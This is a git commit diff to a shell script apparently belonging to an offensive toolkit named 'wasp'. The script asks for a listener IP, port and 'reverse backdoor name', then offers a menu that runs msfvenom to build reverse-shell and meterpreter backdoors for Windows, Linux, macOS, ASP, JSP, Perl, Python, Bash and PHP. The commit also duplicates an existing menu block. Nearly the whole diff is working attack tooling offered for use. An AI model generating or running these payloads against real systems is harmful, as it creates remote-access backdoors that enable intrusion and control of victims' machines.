db4b5cb0acf31e28b1a49f428f90dabb82ea05cc
gl0ryX <sup3rcc@gmail.com>
2017-10-18 11:22:17 +0300

    Update payloads.sh

--- payloads.sh
+++ payloads.sh
@@ -31,6 +31,7 @@ read lport
 echo -e "\e[1;31mPlease enter reverse backdoor name:\e[0m"
 read bkname
 mkdir -p /usr/share/wasp/payloads
+payloadsf="/usr/share/wasp/payloads/"
 while :
 do
 echo
@@ -48,6 +49,26 @@ echo -e "\e[1;32m11. Exit.\e[0m"
 echo
 echo -e "\e[1;36m1. Choice.\e[0m"
 read -n3
+echo $choice
+case "$REPLY" in
+     1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > /usr/share/wasp/payloads/$bkname.exe ;;
+     2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > /usr/share/wasp/payloads/$bkname.elf ;;
+     3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > /usr/share/wasp/payloads/$bkname.macho ;;
+     4) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f asp > /usr/share/wasp/payloads/$bkname.asp ;;
+     5) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.jsp ;;
+     6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.pl ;;
+     7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.py ;;
+     8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.sh ;;
+     9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.php ;;
+     10) wasp ;;
+     11) exit ;;
+     *) echo; echo "Invalid choice."; echo
+esac
+sleep 1
+echo -e "\e[1;31m. Go to $payloadsf \e[0m"
+ls $payloadsf
+done
+
 echo $choice
 case "$REPLY" in
      1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > /usr/share/wasp/payloads/$bkname.exe ;;
